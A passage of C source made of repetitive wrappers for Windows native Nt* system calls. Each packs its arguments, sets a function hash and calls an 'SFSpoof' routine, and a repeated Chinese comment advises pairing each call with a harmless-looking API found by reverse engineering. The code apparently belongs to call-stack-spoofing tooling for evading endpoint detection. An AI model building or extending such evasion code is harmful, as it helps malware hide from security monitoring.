    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtReleaseWorkerFactoryWorker(HANDLE WorkerFactoryHandle) {
    Params.param[1] = (DWORD_PTR)WorkerFactoryHandle;
    Params.param[2] = 0;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 1;
    Params.FuncHash = 0x0FC49D291;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtRemoveIoCompletionEx(HANDLE IoCompletionHandle, PFILE_IO_COMPLETION_INFORMATION IoCompletionInformation, ULONG Count, PULONG NumEntriesRemoved, PLARGE_INTEGER Timeout, BOOLEAN Alertable) {
    Params.param[1] = (DWORD_PTR)IoCompletionHandle;
    Params.param[2] = (DWORD_PTR)IoCompletionInformation;
    Params.param[3] = (DWORD_PTR)Count;
    Params.param[4] = (DWORD_PTR)NumEntriesRemoved;
    Params.param[5] = (DWORD_PTR)Timeout;
    Params.param[6] = (DWORD_PTR)Alertable;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 6;
    Params.FuncHash = 0x0C290F02A;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtRemoveProcessDebug(HANDLE ProcessHandle, HANDLE DebugObjectHandle) {
    Params.param[1] = (DWORD_PTR)ProcessHandle;
    Params.param[2] = (DWORD_PTR)DebugObjectHandle;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x000A6112E;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtRenameKey(HANDLE KeyHandle, PUNICODE_STRING NewName) {
    Params.param[1] = (DWORD_PTR)KeyHandle;
    Params.param[2] = (DWORD_PTR)NewName;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x08EEEA54C;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtRenameTransactionManager(PUNICODE_STRING LogFileName, LPGUID ExistingTransactionManagerGuid) {
    Params.param[1] = (DWORD_PTR)LogFileName;
    Params.param[2] = (DWORD_PTR)ExistingTransactionManagerGuid;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x083B75B9D;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtReplaceKey(POBJECT_ATTRIBUTES NewFile, HANDLE TargetHandle, POBJECT_ATTRIBUTES OldFile) {
    Params.param[1] = (DWORD_PTR)NewFile;
    Params.param[2] = (DWORD_PTR)TargetHandle;
    Params.param[3] = (DWORD_PTR)OldFile;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 3;
    Params.FuncHash = 0x066C48BA0;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtReplacePartitionUnit(PUNICODE_STRING TargetInstancePath, PUNICODE_STRING SpareInstancePath, ULONG Flags) {
    Params.param[1] = (DWORD_PTR)TargetInstancePath;
    Params.param[2] = (DWORD_PTR)SpareInstancePath;
    Params.param[3] = (DWORD_PTR)Flags;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 3;
    Params.FuncHash = 0x0287B0CEC;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtReplyWaitReplyPort(HANDLE PortHandle, PPORT_MESSAGE ReplyMessage) {
    Params.param[1] = (DWORD_PTR)PortHandle;
    Params.param[2] = (DWORD_PTR)ReplyMessage;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x0A63493AA;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtRequestPort(HANDLE PortHandle, PPORT_MESSAGE RequestMessage) {
    Params.param[1] = (DWORD_PTR)PortHandle;
    Params.param[2] = (DWORD_PTR)RequestMessage;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x02CB6292C;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtResetEvent(HANDLE EventHandle, PULONG PreviousState) {
    Params.param[1] = (DWORD_PTR)EventHandle;
    Params.param[2] = (DWORD_PTR)PreviousState;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x0C84ED1C0;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtResetWriteWatch(HANDLE ProcessHandle, PVOID BaseAddress, ULONG RegionSize) {
    Params.param[1] = (DWORD_PTR)ProcessHandle;
    Params.param[2] = (DWORD_PTR)BaseAddress;
    Params.param[3] = (DWORD_PTR)RegionSize;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 3;
    Params.FuncHash = 0x0F5780E2A;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtRestoreKey(HANDLE KeyHandle, HANDLE FileHandle, ULONG Flags) {
    Params.param[1] = (DWORD_PTR)KeyHandle;
    Params.param[2] = (DWORD_PTR)FileHandle;
    Params.param[3] = (DWORD_PTR)Flags;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 3;
    Params.FuncHash = 0x0C942F2F0;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtResumeProcess(HANDLE ProcessHandle) {
    Params.param[1] = (DWORD_PTR)ProcessHandle;
    Params.param[2] = 0;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 1;
    Params.FuncHash = 0x0F63BD7A7;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtRevertContainerImpersonation() {
    Params.param[1] = 0;
    Params.param[2] = 0;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 0;
    Params.FuncHash = 0x0DE49DEDF;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtRollbackComplete(HANDLE EnlistmentHandle, PLARGE_INTEGER TmVirtualClock) {
    Params.param[1] = (DWORD_PTR)EnlistmentHandle;
    Params.param[2] = (DWORD_PTR)TmVirtualClock;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x08921182D;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtRollbackEnlistment(HANDLE EnlistmentHandle, PLARGE_INTEGER TmVirtualClock) {
    Params.param[1] = (DWORD_PTR)EnlistmentHandle;
    Params.param[2] = (DWORD_PTR)TmVirtualClock;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x031B9F6EA;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtRollbackRegistryTransaction(HANDLE RegistryHandle, BOOL Wait) {
    Params.param[1] = (DWORD_PTR)RegistryHandle;
    Params.param[2] = (DWORD_PTR)Wait;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x0C4D5E241;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtRollbackTransaction(HANDLE TransactionHandle, BOOLEAN Wait) {
    Params.param[1] = (DWORD_PTR)TransactionHandle;
    Params.param[2] = (DWORD_PTR)Wait;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x0C8920FC2;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtRollforwardTransactionManager(HANDLE TransactionManagerHandle, PLARGE_INTEGER TmVirtualClock) {
    Params.param[1] = (DWORD_PTR)TransactionManagerHandle;
    Params.param[2] = (DWORD_PTR)TmVirtualClock;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x0CB93D238;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtSaveKey(HANDLE KeyHandle, HANDLE FileHandle) {
    Params.param[1] = (DWORD_PTR)KeyHandle;
    Params.param[2] = (DWORD_PTR)FileHandle;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x0E720CC82;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtSaveKeyEx(HANDLE KeyHandle, HANDLE FileHandle, ULONG Format) {
    Params.param[1] = (DWORD_PTR)KeyHandle;
    Params.param[2] = (DWORD_PTR)FileHandle;
    Params.param[3] = (DWORD_PTR)Format;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 3;
    Params.FuncHash = 0x029A2D6C5;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtSaveMergedKeys(HANDLE HighPrecedenceKeyHandle, HANDLE LowPrecedenceKeyHandle, HANDLE FileHandle) {
    Params.param[1] = (DWORD_PTR)HighPrecedenceKeyHandle;
    Params.param[2] = (DWORD_PTR)LowPrecedenceKeyHandle;
    Params.param[3] = (DWORD_PTR)FileHandle;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 3;
    Params.FuncHash = 0x055B56E3E;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtSecureConnectPort(PHANDLE PortHandle, PUNICODE_STRING PortName, PSECURITY_QUALITY_OF_SERVICE SecurityQos, PPORT_SECTION_WRITE ClientView, PSID RequiredServerSid, PPORT_SECTION_READ ServerView, PULONG MaxMessageLength, PVOID ConnectionInformation, PULONG ConnectionInformationLength) {
    Params.param[1] = (DWORD_PTR)PortHandle;
    Params.param[2] = (DWORD_PTR)PortName;
    Params.param[3] = (DWORD_PTR)SecurityQos;
    Params.param[4] = (DWORD_PTR)ClientView;
    Params.param[5] = (DWORD_PTR)RequiredServerSid;
    Params.param[6] = (DWORD_PTR)ServerView;
    Params.param[7] = (DWORD_PTR)MaxMessageLength;
    Params.param[8] = (DWORD_PTR)ConnectionInformation;
    Params.param[9] = (DWORD_PTR)ConnectionInformationLength;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 9;
    Params.FuncHash = 0x018B11B3E;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtSerializeBoot() {
    Params.param[1] = 0;
    Params.param[2] = 0;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 0;
    Params.FuncHash = 0x032E2583D;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtSetBootEntryOrder(PULONG Ids, ULONG Count) {
    Params.param[1] = (DWORD_PTR)Ids;
    Params.param[2] = (DWORD_PTR)Count;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x00B91070B;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtSetBootOptions(PBOOT_OPTIONS BootOptions, ULONG FieldsToChange) {
    Params.param[1] = (DWORD_PTR)BootOptions;
    Params.param[2] = (DWORD_PTR)FieldsToChange;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x0099D0F0D;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtSetCachedSigningLevel(ULONG Flags, SE_SIGNING_LEVEL InputSigningLevel, PHANDLE SourceFiles, ULONG SourceFileCount, HANDLE TargetFile) {
    Params.param[1] = (DWORD_PTR)Flags;
    Params.param[2] = (DWORD_PTR)InputSigningLevel;
    Params.param[3] = (DWORD_PTR)SourceFiles;
    Params.param[4] = (DWORD_PTR)SourceFileCount;
    Params.param[5] = (DWORD_PTR)TargetFile;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 5;
    Params.FuncHash = 0x0A8FBFC44;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtSetCachedSigningLevel2(ULONG Flags, ULONG InputSigningLevel, PHANDLE SourceFiles, ULONG SourceFileCount, HANDLE TargetFile, PVOID LevelInformation) {
    Params.param[1] = (DWORD_PTR)Flags;
    Params.param[2] = (DWORD_PTR)InputSigningLevel;
    Params.param[3] = (DWORD_PTR)SourceFiles;
    Params.param[4] = (DWORD_PTR)SourceFileCount;
    Params.param[5] = (DWORD_PTR)TargetFile;
    Params.param[6] = (DWORD_PTR)LevelInformation;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 6;
    Params.FuncHash = 0x0EC537584;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtSetContextThread(HANDLE ThreadHandle, PCONTEXT Context) {
    Params.param[1] = (DWORD_PTR)ThreadHandle;
    Params.param[2] = (DWORD_PTR)Context;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x034ACCEBA;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtSetDebugFilterState(ULONG ComponentId, ULONG Level, BOOLEAN State) {
    Params.param[1] = (DWORD_PTR)ComponentId;
    Params.param[2] = (DWORD_PTR)Level;
    Params.param[3] = (DWORD_PTR)State;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 3;
    Params.FuncHash = 0x06AD45B8A;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtSetDefaultHardErrorPort(HANDLE PortHandle) {
    Params.param[1] = (DWORD_PTR)PortHandle;
    Params.param[2] = 0;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 1;
    Params.FuncHash = 0x0DA8FCF2F;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtSetDefaultLocale(BOOLEAN UserProfile, LCID DefaultLocaleId) {
    Params.param[1] = (DWORD_PTR)UserProfile;
    Params.param[2] = (DWORD_PTR)DefaultLocaleId;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x0E32A91FD;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtSetDefaultUILanguage(LANGID DefaultUILanguageId) {
    Params.param[1] = (DWORD_PTR)DefaultUILanguageId;
    Params.param[2] = 0;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 1;
    Params.FuncHash = 0x0538D6058;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtSetDriverEntryOrder(PULONG Ids, PULONG Count) {
    Params.param[1] = (DWORD_PTR)Ids;
    Params.param[2] = (DWORD_PTR)Count;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x01FAC3F1F;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtSetEaFile(HANDLE FileHandle, PIO_STATUS_BLOCK IoStatusBlock, PFILE_FULL_EA_INFORMATION EaBuffer, ULONG EaBufferSize) {
    Params.param[1] = (DWORD_PTR)FileHandle;
    Params.param[2] = (DWORD_PTR)IoStatusBlock;
    Params.param[3] = (DWORD_PTR)EaBuffer;
    Params.param[4] = (DWORD_PTR)EaBufferSize;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 4;
    Params.FuncHash = 0x066FB8BB2;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtSetHighEventPair(HANDLE EventPairHandle) {
    Params.param[1] = (DWORD_PTR)EventPairHandle;
    Params.param[2] = 0;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
